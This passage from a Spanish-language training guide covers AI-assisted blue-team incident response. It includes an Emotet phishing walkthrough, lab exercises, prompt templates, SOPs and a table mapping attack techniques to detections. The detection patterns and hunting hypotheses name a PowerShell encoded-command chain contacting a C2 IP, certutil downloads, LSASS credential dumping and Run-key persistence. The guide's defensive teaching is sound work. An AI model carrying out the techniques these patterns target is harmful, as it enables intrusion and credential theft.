         Borrador de tabla para auditor (markdown) listo. ¿Lo ajustás o lo exporto a TheHive?"

Vos:  "Exportalo a TheHive y agregá plan de remediación con fechas."
```

### 8.2 Gap analysis sin dolor

```
Vos:  "¿Qué nos falta para ISO 27001 A.8.15 (logging) según lo que ve Wazuh?"

Agente: "Gap analysis A.8.15:
         ✅ Logs centralizados en Wazuh (90 días online)
         ✅ Integridad con agente + FIM
         ❌ Retención 1 año solo en 60% de hosts (faltan 12 servidores legacy)
         ❌ Sin review trimestral documentado de logs
         Plan: extender retención + calendarizar review con evidencia en TheHive.
         ¿Genero checklist?"
```

### 8.3 El agente no inventa compliance

> ⚠️ El agente propone mapeos, **vos validás con el auditor**. Un mapeo mal hecho te hace perder una certificación. Pedile siempre que cite **anexo y control exacto**, no "ISO 27001 en general".

---

## 9. Flujo blue team no-code completo — detecta → investiga → contiene → recupera → lección

Este es el **playbook end-to-end** que une todo. Es el espejo del flujo ofensivo de [A2 §9](./02-A2-0ff3ns1v3-4g3nt3s.md#9-del-hallazgo-al-reporte--el-agente-redacta-vos-firmás) pero del lado defensa.

<!-- DIAGRAM: architecture SOC end-to-end — fila superior: Fuentes (Sysmon, Wazuh, EDR, Firewall, MISP); centro: Agente Blue con 5 fases en círculo (Detecta → Investiga → Contiene → Recupera → Lección) con gate humano entre cada fase; abajo: Salidas (TheHive case, Informe, Hardening backlog, Sigma rule nueva) -->

### 9.1 Las 5 fases con agente

| Fase | Vos hacés | Agente hace | Gate |
|---|---|---|---|
| **1. Detecta** | Definís qué monitorear | Consulta SIEM/EDR, propone queries, triagea alertas | Aprobás queries y ventana |
| **2. Investiga** | Formulás hipótesis | Traduce a Sigma/KQL, correlaciona, enriquece IOCs | Validás hipótesis y filtros |
| **3. Contiene** | Decidís estrategia | Prepara playbook SOAR paso a paso | **Aprobás cada acción irreversible** |
| **4. Recupera** | Validás negocio | Propone hardening, valida parche, monitorea regresión | Aprobás ventana y rollback |
| **5. Lección** | Firmás informe | Redacta timeline, mapea a MITRE/ISO, propone Sigma nueva | Revisás y publicás |

### 9.2 Ejemplo walkthrough — phishing Emotet (mismo caso que A2, lado blue)

```
── FASE 1: DETECTA ──
Vos:  "¿Hay anomalías en WS-FIN-042 últimas 12hs?"
Agente: "OUTLOOK → powershell -enc → rundll32 con C2 185.220.101.47. Severidad Alta. ¿Investigo?"

── FASE 2: INVESTIGA ──
Vos:  "Sí, investigá. ¿Es Emotet? ¿Hay más hosts?"
Agente: "Enriquezco IOCs: VT 42/92 Emotet, OTX 12 pulsos. Hunteo hash en EDR: solo WS-FIN-042. Sigma T1566.001 matchea."

── FASE 3: CONTIENE (con aprobación) ──
Agente: "Propongo: 1) Aislar WS-FIN-042 2) Bloquear 185.220.101.47 en proxy 3) Dumpear KAPE triage. ¿Aprobás paso 1?"
Vos:  "APROBADO paso 1. Ticket INC-2026-0842."
Agente: "Aislado. ¿Aprobás paso 2?"
Vos:  "Aprobado paso 2."
Agente: "IP bloqueada. ¿Aprobás dump?"
Vos:  "Aprobado, solo triage a s3://forense/INC-2026-0842/"

── FASE 4: RECUPERA ──
Agente: "Dump OK. Persistencia: Run key + Scheduled Task. Propongo: borrar persistencia, reset pass ana.garcia, reimagen host. ¿Aprobás plan?"
Vos:  "Aprobado reimagen + reset. Hardening: bloquear macros no firmadas."
Agente: "Reimagen OK. OpenSCAP CIS 2.2.7 ahora PASS. Validado."

── FASE 5: LECCIÓN ──
Agente: "Borrador de informe + Sigma rule nueva 'emotet_invoice_dll' + lección: bloquear macros no firmadas en Finanzas.
         Mapeo: MITRE T1566.001, T1059.001, T1547.001 — ISO A.8.7 — NIST PR.PT-1
         ¿Revisás borrador en TheHive?"
Vos:  "Reviso y firmo. Publicá Sigma en repo interno."
```

### 9.3 Checklist de cierre — no cierres sin esto

- [ ] Timeline completa con timestamps y fuentes citadas
- [ ] IOCs enriquecidos (≥3 feeds) y bloqueados donde corresponde
- [ ] Hosts afectados listados y validados (no solo el primero)
- [ ] Persistencia eliminada y validada (segundo scan limpio)
- [ ] Credenciales reseteadas + sesiones invalidadas
- [ ] Hardening aplicado y validado (OpenSCAP/Lynis PASS)
- [ ] Caso TheHive cerrado con evidencias adjuntas
- [ ] Sigma rule nueva creada y testeada contra logs históricos
- [ ] Lección aprendida documentada y backlog de mejora

---

## 10. Ejercicios prácticos — 5 labs para defender sin romper nada

> Todos en lab aislado. Nunca en prod sin autorización. Cada ejercicio tiene gate humano explícito.

### Ejercicio 1 — Wazuh lab: de alerta a caso TheHive (2 hs)

**Objetivo:** Triagear una alerta real de Wazuh y crear caso en TheHive con el agente.

**Setup:** Wazuh lab (VM Ubuntu + agente Wazuh en WS-FIN-042 simulado, ver [docs/wazuh-lab.md]) + TheHive + Cortex (VT/OTX).

**Pasos:**

1. Importá el dataset `wazuh-alerts-phishing.json` (incluido en repo) a tu Wazuh.
2. Pedile al agente: "Triageá alertas nivel 10+ últimas 24hs en WS-FIN-042, enriquecé IOCs y proponé severidad."
3. Validá los hallazgos del agente contra los logs crudos (no te fíes a ciegas).
4. Pedile que genere borrador de caso TheHive con observables y MITRE.
5. Creá el caso y ejecutá Cortex analyzers desde el agente.

**Entregable:** Caso TheHive #XXX con 3 observables enriquecidos y timeline de 5 eventos.

**Pregunta trampa del agente (para validar que pensás):** "¿Bloqueo la IP ya?" — Vos debés responder: "No, solo enriquecer. Bloqueo requiere aprobación y ticket."

### Ejercicio 2 — Security Onion + Sigma: hunteo guiado (3 hs)

**Objetivo:** Traducir 3 hipótesis a Sigma/KQL y cazar en Security Onion.

**Setup:** Security Onion 2.4 (Elastic + Suricata + Zeek) con dataset `so-phishing-pcap.zip`.

**Hipótesis a cazar:**

1. "PowerShell con base64 y conexión a IP externa"
2. "Certutil descargando exe"
3. "Outlook ejecutando hijo sospechoso"

**Pasos:**

1. Para cada hipótesis, pedile al agente: "Traducí a Sigma y a KQL para Elastic."
2. Revisá la query que propone — ¿filtró bien? ¿No es demasiado ruidosa?
3. Ejecutá en Security Onion (solo lectura) y documentá hits.
4. Pedile al agente que mapee cada hit a MITRE y proponga severidad.

**Entregable:** 3 queries Sigma + 3 KQL + tabla de hits con MITRE y severidad validada.

### Ejercicio 3 — Velociraptor + KAPE: forense triage sin tocar original (3 hs)

**Objetivo:** Hacer triage forense de un host "comprometido" con Velociraptor y que el agente resuma.

**Setup:** Velociraptor server + endpoint lab (Windows 10) + imagen KAPE triage `kape-phishing-case.zip`.

**Pasos:**

1. Colección Velociraptor: `Windows.KapeFiles.Targets` (triage) sobre copia, no original.
2. Pedile al agente: "Resumí Amcache + Registry Run keys + MFT en ventana 09:00-10:00, buscá persistencia."
3. Validá manualmente 2 hallazgos del agente en Registry Viewer / Timeline Explorer.
4. Pedile que genere reporte de persistencia con MITRE y propuesta de remediación (sin ejecutar).
5. Documentá en TheHive.

**Entregable:** Reporte de persistencia (2 mecanismos encontrados) con evidencia y plan de remediación sin ejecutar.

**Gate crítico:** El agente debe decir "trabajando sobre copia". Si no lo dice, corregilo.

### Ejercicio 4 — TheHive + MISP: CTI y bloqueo con aprobación (2 hs)

**Objetivo:** Enriquecer IOCs y practicar el gate de bloqueo.

**Setup:** TheHive + Cortex + MISP lab (o OTX gratuito).

**Pasos:**

1. Cargá los IOCs del caso phishing (IP 185.220.101.47, hash invoice.dll, dominio phishing) como observables en TheHive.
2. Pedile al agente: "Enriquecé con VT, OTX y MISP, correlacioná y priorizá."
3. Validá confianza: ¿cuántas fuentes? ¿Cuántas detecciones?
4. Pedile que prepare propuesta de bloqueo (firewall/proxy) **sin ejecutar**.
5. Simulá aprobación: "APROBADO bloqueo IP 185.220.101.47 en proxy lab" y que el agente loguee la acción como si la ejecutara (dry-run).

**Entregable:** Tabla de enriquecimiento (3 IOCs × 3 feeds) + propuesta de bloqueo con gate documentado.

### Ejercicio 5 — Lynis + OpenSCAP: hardening end-to-end con validación (3 hs)

**Objetivo:** Auditar, proponer, aplicar y validar hardening CIS en lab.

**Setup:** 2 VMs lab (Ubuntu SRV-WEB-01, Windows WS-FIN-042) + Lynis + OpenSCAP.

**Pasos:**

1. Pedile al agente: "Auditá ambas VMs contra CIS Level 1, priorizá por riesgo."
2. Elegí 2 controles FAIL de riesgo Alto/Medio y pedile plan de remediación con rollback.
3. Aprobá y aplicá **uno solo** en ventana simulada (snapshot antes).
4. Pedile validación post-harding: "¿El fix pasó y no rompió nada?"
5. Documentá gap y lección en TheHive.

**Entregable:** Reporte Lynis/OpenSCAP antes/después + plan con rollback + validación.

**Bonus track:** Pedile al agente que mapee los 2 controles a ISO 27001 y NIST CSF.

---

## 11. Apéndice A — Prompts defensivos y SOPs listos para copiar

### 11.1 Prompts base (copiar, pegar, adaptar)

**A. Detección genérica:**

```
Actuá como SOC Tier 1. Acceso SOLO LECTURA a [SIEM] índice [índice] host [host] ventana [X hs].
Tarea: [hipótesis en una línea].
Entregá: tabla timestamp | host | evento | usuario/IP | severidad | hipótesis (1 línea).
Citá query e índice por cada hallazgo. Si no hay hallazgos, decí "sin hallazgos" — no inventes.
No propongas contención en este paso.
```

**B. Threat hunting Sigma→KQL:**

```
Traducí esta hipótesis a Sigma y a KQL para Elastic:
Hipótesis: "[hipótesis]"
Requisitos: excluí baseline [hosts/IPs legítimas], ventana [X hs], solo lectura.
Entregá: Sigma YAML + KQL + explicación de cada filtro + MITRE ATT&CK mapeado.
Preguntá confirmación antes de ejecutar.
```

**C. Enriquecimiento CTI:**

```
Enriquecé estos IOCs [lista] contra VirusTotal, OTX, MISP, AbuseIPDB.
Para cada IOC: tabla con fuente | veredicto | confianza | campaña/TTP si aplica.
No envíes datos sensibles de cliente, solo IOCs listados.
Priorizá por confianza (nº fuentes + detecciones). Proponé siguiente paso pero NO bloquees sin aprobación.
```

**D. Forense triage:**

```
Resumí esta evidencia forense (copia, no original): [Plaso CSV / KAPE / mem dump] ventana [X].
Agrupá por tipo (file, registry, process, network), correlacioná con Sysmon misma ventana.
Entregá: timeline de 10-20 eventos clave + 2-3 hipótesis + qué falta para confirmar.
Trabajá solo sobre copia. Citá offset/timestamp por hallazgo.
```

**E. Hardening audit:**

```
Auditá [host] contra CIS Level 1 con Lynis/OpenSCAP (solo lectura).
Entregá: tabla control | estado | riesgo | esfuerzo | ¿rompe algo? | fix sugerido.
Priorizá por riesgo. Proponé plan con snapshot/rollback y ventana. No apliques sin aprobación.
```

**F. SOAR playbook (con gate):**

```
Playbook: [Phishing | Ransomware | Brute force | Exfil]
Contexto: host [host], IOCs [lista], ticket [ID]
Instrucción: prepará playbook paso a paso. Cada paso con: acción, tool, impacto, gate humano.
No ejecutes ningún paso sin mi aprobación explícita "APROBADO paso N".
Logueá cada acción con timestamp y ID.
```

**G. Compliance mapping:**

```
Mapeá estos hallazgos [lista] a ISO 27001:2022 y NIST CSF 2.0.
Para cada uno: control exacto (anexo + ID) + descripción + evidencia requerida + plan remediación.
Citá control exacto, no genérico. Si dudás, decí "requiere validación con auditor".
```

### 11.2 SOPs (Standard Operating Procedures) — el agente los lee, vos los firmás

**SOP-01: Triage de alerta (15 min)**

```
1. Agente consulta SIEM (solo lectura) con query propuesta → humano aprueba
2. Agente enriquece IOCs (si hay) → humano valida fuentes
3. Agente propone severidad (Alta/Media/Baja) con justificación → humano confirma o ajusta
4. Si Alta → crear caso TheHive (borrador) → humano revisa y crea
5. Si Media/Baja → documentar y monitorear, no escalar sin correlación
Gate: sin severidad validada no se escala ni se contiene.
```

**SOP-02: Contención de host (requiere ticket + aprobación)**

```
1. Agente prepara propuesta: host, impacto, rollback, ticket ID
2. Humano aprueba explícitamente: "APROBADO aislar [host] — [ticket]"
3. Agente ejecuta aislamiento vía EDR/Velociraptor, loguea action ID
4. Agente verifica aislamiento (segundo query: host sin conectividad salvo EDR)
5. Humano valida y autoriza siguiente paso (dump forense)
Gate: sin "APROBADO" literal no hay ejecución. Dry-run si no hay ticket.
```

**SOP-03: Bloqueo de IOC (IP/dominio/hash)**

```
1. Agente enriquece IOC (≥3 feeds) y calcula confianza
2. Si confianza Alta (≥3 fuentes, ≥20 detecciones) → propone bloqueo
3. Humano valida: ¿afecta negocio? (ej: IP de CDN legítimo) → aprueba/rechaza
4. Si aprobado → agente prepara regla firewall/proxy (borrador) → humano revisa regla
5. Agente aplica regla, loguea, agenda revisión en 7 días (bloqueo temporal por defecto)
Gate: bloqueo siempre temporal y revisable. Nunca permanente sin revisión.
```

**SOP-04: Cierre de caso**

```
1. Timeline completa + IOCs enriquecidos + hosts validados
2. Persistencia eliminada y validada (segundo scan limpio)
3. Hardening aplicado y validado (OpenSCAP PASS)
4. Sigma rule nueva testeada contra histórico
5. Informe revisado por humano + lección aprendida en backlog
Gate: sin checklist 9.3 completo no se cierra caso.
```

### 11.3 Frases que tu agente defensivo DEBE decir (y si no las dice, corregilo)

| Situación | Frase esperada del agente |
|---|---|
| Antes de consultar SIEM | "¿Confirmás scope [índice, host, ventana] solo lectura?" |
| Antes de enriquecer IOC | "¿Confirmás que puedo consultar IOCs externos? Solo envío IOCs, no datos de cliente." |
| Antes de aislar/bloquear | "Requiere aprobación explícita. Respondé 'APROBADO [acción] — [ticket]'." |
| Antes de forense | "Trabajo sobre copia, no sobre original. ¿Confirmás path de copia?" |
| Antes de hardening | "Propuesta con snapshot y rollback. ¿Aprobás ventana?" |
| Al no encontrar nada | "Sin hallazgos en [scope] — no hay evidencia de [hipótesis] en esa ventana." (no inventa) |
| Al dudar | "Requiere validación humana / consultar con auditor." (no alucina) |

---

## 12. Apéndice B — Glosario blue + tabla de herramientas

### Glosario rápido

| Término | En criollo |
|---|---|
| **SIEM** | Donde caen todos los logs (Splunk, Elastic, Wazuh) |
| **SOAR** | Playbooks que orquestan respuesta (TheHive + Cortex, Shuffle) |
| **EDR** | Antivirus con esteroides que ve procesos/red (Defender, CrowdStrike) |
| **Sysmon** | Logger de Windows que ve todo (procesos, red, registry) — IDs 1,3,7,11 clave |
| **Sigma** | Formato universal para reglas de detección (YAML → SPL/KQL) |
| **KQL / SPL** | Lenguajes de query de Elastic/Splunk — el agente los escribe por vos |
| **MTTD/MTTR** | Tiempo medio para detectar / responder — lo que el agente baja |
| **IOC** | Indicador de compromiso (IP, hash, dominio, URL) |
| **TTP** | Táctica, Técnica y Procedimiento (MITRE ATT&CK) |
| **CTI** | Intel de amenazas (feeds de IOCs + contexto) |
| **CIS Benchmark** | Checklist de hardening por sistema (300 controles aprox) |
| **TLP** | Traffic Light Protocol (cómo compartir info: WHITE/GREEN/AMBER/RED) |

### Tabla de herramientas — qué hace cada una y cómo la pedís

| Herramienta | Tipo | Cómo la invocás sin código |
|---|---|---|
| **Wazuh** | SIEM + IDS + SCA | "Consultá Wazuh índice wazuh-alerts-* últimas 24hs" |
| **Security Onion** | NSM (Suricata, Zeek, Elastic) | "Hunteá en Security Onion con esta Sigma" |
| **Splunk / Elastic** | SIEM | "Pasá esta hipótesis a SPL/KQL y ejecutá" |
| **Velociraptor** | DFIR + EDR FOSS | "Recolectá KAPE triage de [host] a [destino]" |
| **KAPE** | Artefactos forenses | "Resumí KAPE de [host] ventana [X]" |
| **Plaso / Timesketch** | Timeline forense | "Resumí plaso.csv ventana [X] y correlacioná con Sysmon" |
| **Volatility** | Memoria forense | "Analizá mem.raw con pslist+malfind+netscan" |
| **TheHive** | Case management IR | "Creá caso en TheHive con estos observables" |
| **Cortex** | Enrichment (VT, OTX…) | "Enriquecé este IOC con Cortex" |
| **MISP / OTX** | CTI sharing | "Consultá MISP/OTX para este IOC" |
| **Lynis / OpenSCAP** | Hardening audit | "Auditá [host] contra CIS Level 1" |
| **SigmaHQ** | Reglas detección | "Buscá Sigma para T1059.001" |

---

## 13. Apéndice C — Mapa A1/A2/A3 y próximos pasos

### ¿Dónde encaja A3?

```
A1 — Fundamentos (qué es un agente, cómo hablarle, loops, guardrails)
 └─→ A2 — Ofensivo (recon → exploit → reporte)  ← espejo
      └─→ A3 — Defensivo (detecta → responde → endurece)  ← estás acá
           └─→ Próximos: A4 (Agentes Autónomos + Multi-Agente) — orquestar blue+red
```

| Módulo | Pregunta que responde | Si te gustó A3, seguí con |
|---|---|---|
| [A1](./01-A1-4g3nt3s-f0nd4m3nt0s.md) | ¿Cómo hablo con un agente sin que se zarpe? | Releé §4 (prompting) y §7 (riesgos) |
| [A2](./02-A2-0ff3ns1v3-4g3nt3s.md) | ¿Cómo piensan los atacantes? | Cruzá cada técnica A2 con su detección A3 (tabla MITRE) |
| **A3 (este doc)** | ¿Cómo detecto y respondo sin código? | Practicá los 5 labs en orden |
| **Siguiente** | ¿Cómo orquesto blue+red con multi-agente? | A4 — Agentes Autónomos (cuando salga) |

### Tabla espejo A2 ↔ A3 — cada ataque tiene su defensa

| Técnica A2 (ofensiva) | Detección A3 (defensiva) | Sigma / Log source |
|---|---|---|
| Phishing con macro (T1566.001) | OUTLOOK.EXE → powershell -enc | `proc_creation_win_office_macro` + Sysmon 1 |
| PowerShell base64 (T1059.001) | ScriptBlockLogging + AMSI | `posh_ps_susp_execution` + Event 4104 |
| Certutil download (T1105) | certutil con urlcache + network | `proc_creation_win_certutil_download` + Sysmon 3 |
| RDP brute force (T1110.001) | 4625 → 4624 misma IP 5 min | `win_bruteforce` + Security 4625/4624 |
| LSASS dump (T1003.001) | lsass access + comsvcs.dll | `proc_access_win_lsassy` + Sysmon 10 |
| Run key persistence (T1547.001) | Registry Run key creada | `registry_set_run_key` + Sysmon 13 |
| C2 beacon (T1071.001) | Conexión periódica a IP rara | `net_connection_win_susp_c2` + Sysmon 3 + proxy |

### Próximos pasos concretos

1. **Hacé los 5 labs en orden** — no saltees el 1 (Wazuh→TheHive) que es la base de todo.
2. **Armá tu SOP personal** — copiá los 4 SOPs del Apéndice A a tu repo y adaptalos a tu lab.
3. **Cruzá con A2** — por cada técnica que probaste en A2, escribí la query de detección A3. Es el mejor ejercicio de purple team sin código.
4. **Sumate a un CTI feed** — creá cuenta en OTX (gratis) y MISP lab, practicá enriquecimiento real.
5. **Documentá en TheHive** — cada lab, un caso. Tu portfolio defensivo se arma solo.

> 🛡️ Cierre: el agente defensivo no te hace SOC solo — te hace **SOC más rápido y con menos burnout**. Pero el que firma el caso, aísla el host y explica en auditoría sos vos. El agente es tu analyst 24/7; vos sos el responsable. Usalo para **detectar antes, responder mejor y endurecer con evidencia** — nunca para auto-remediar a ciegas.

---

> **Versión:** 1.0 — **Actualizado:** 2026-05-24 — **Fuentes:** Wazuh docs, Elastic Detection Rules, SigmaHQ, MITRE ATT&CK v14, CIS Benchmarks, Velociraptor docs, TheHive/Cortex docs, SANS Blue Team.

